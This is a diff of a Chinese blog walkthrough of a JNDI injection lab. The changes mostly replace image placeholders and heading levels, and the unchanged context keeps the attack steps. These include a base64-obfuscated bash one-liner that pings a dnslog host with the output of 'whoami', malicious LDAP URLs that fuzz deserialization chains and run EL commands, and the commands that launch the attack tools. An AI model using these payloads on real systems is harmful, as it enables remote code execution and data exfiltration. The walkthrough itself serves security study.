@@ -84,7 +84,7 @@ your-ip = 服务器的ip 而不是 docker 的ip
 那么就是访问: http://192.168.24.129:8090
 ```
 
-*（配图略）*
+![pasted image 20260703173421](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173421.png)
 
 
 
@@ -116,9 +116,9 @@ Content-Length: 258
 }
 ```
 
-*（配图略）*
+![pasted image 20260703173428](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173428.png)
 
-*（配图略）*
+![pasted image 20260703173438](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173438.png)
 
 ## 0x04 整体环境说明
 
@@ -134,7 +134,7 @@ B服务器-受害者服务器IP: 192.168.24.129
 因此判断是不是出网的在初期还是比较重要的
 ```
 
-### 0x05.1 利用netcat判断是否出网
+## 0x05.1 利用netcat判断是否出网
 
 ```plain
 第一步: 进入攻击者服务器
@@ -169,7 +169,7 @@ Content-Length: 255
 }
 ```
 
-*（配图略）*
+![pasted image 20260703173433](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173433.png)
 
 ## 0x06 JNDI注入(少用)
 
@@ -191,7 +191,7 @@ JDK增加了com.sun.jndi.ldap.object.trustURLCodebase选项,默认为false
 命令: java -jar JNDI-1.0-all.jar
 ```
 
-*（配图略）*
+![pasted image 20260703173448](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173448.png)
 
 
 
@@ -207,7 +207,7 @@ Base64编码: cGluZyBgd2hvYW1pYC4wcHM1M2QuZG5zbG9nLmNu
 最终command参数填写: bash -c {echo,cGluZyBgd2hvYW1pYC4wcHM1M2QuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}
 ```
 
-*（配图略）*
+![pasted image 20260703173453](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173453.png)
 
 
 
@@ -241,14 +241,14 @@ Content-Length: 264
 
 ```
 
-*（配图略）*
+![pasted image 20260703173533](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173533.png)
 
-*（配图略）*
+![pasted image 20260703173457](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173457.png)
 
-*（配图略）*
+![pasted image 20260703173459](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173459.png)
 
 ## 0x07 JNDI高版本JDK反序列化绕过(常用)
-### 0x07.1 JNDIInject-[version]-SNAPSHOT.jar - 基本使用
+## 0x07.1 JNDIInject-[version]-SNAPSHOT.jar - 基本使用
 
 ```plain
 // 输出-使用说明
@@ -256,9 +256,9 @@ Content-Length: 264
 命令: java -jar JNDIInject-1.2-SNAPSHOT.jar -i 192.168.24.1 -u
 ```
 
-*（配图略）*
+![pasted image 20260703173539](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173539.png)
 
-### 0x07.2 JNDIInject-[version]-SNAPSHOT.jar - 项目启动
+## 0x07.2 JNDIInject-[version]-SNAPSHOT.jar - 项目启动
 
 ```plain
 // 操作对象: 攻击方
@@ -267,16 +267,16 @@ Content-Length: 264
 命令: java -jar JNDIInject-1.2-SNAPSHOT.jar -i 192.168.24.1
 ```
 
-*（配图略）*
+![pasted image 20260703173544](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173544.png)
 
-### 0x07.3 通过dnslog获取反序列化链
+## 0x07.3 通过dnslog获取反序列化链
 
 ```plain
 输入: ldap://192.168.24.1:1389/fuzzbyDNS/[dnslog]
 这样就会自动去爆破链了
 ```
 
-*（配图略）*
+![pasted image 20260703173550](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173550.png)
 
 
 
@@ -307,13 +307,13 @@ Content-Length: 286
 }
 ```
 
-*（配图略）*
+![pasted image 20260703173509](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173509.png)
 
-*（配图略）*
+![pasted image 20260703173512](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173512.png)
 
-*（配图略）*
+![pasted image 20260703173514](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173514.png)
 
-### 0x07.4 反序列化链攻击测试
+## 0x07.4 反序列化链攻击测试
 
 ```plain
 按照上面跑出来的链,可以运行el,执行命令
@@ -324,7 +324,7 @@ Base64编码: cGluZyBgd2hvYW1pYC5yd2c3MmguZG5zbG9nLmNu
 最终输入: ldap://192.168.24.1:1389/EL/base64/cGluZyBgd2hvYW1pYC5yd2c3MmguZG5zbG9nLmNu
 ```
 
-*（配图略）*
+![pasted image 20260703173517](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173517.png)
 
 
 
@@ -355,11 +355,11 @@ Content-Length: 306
 }
 ```
 
-*（配图略）*
+![pasted image 20260703173521](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173521.png)
 
-*（配图略）*
+![pasted image 20260703173524](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173524.png)
 
-*（配图略）*
+![pasted image 20260703173526](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173526.png)
 
 
 
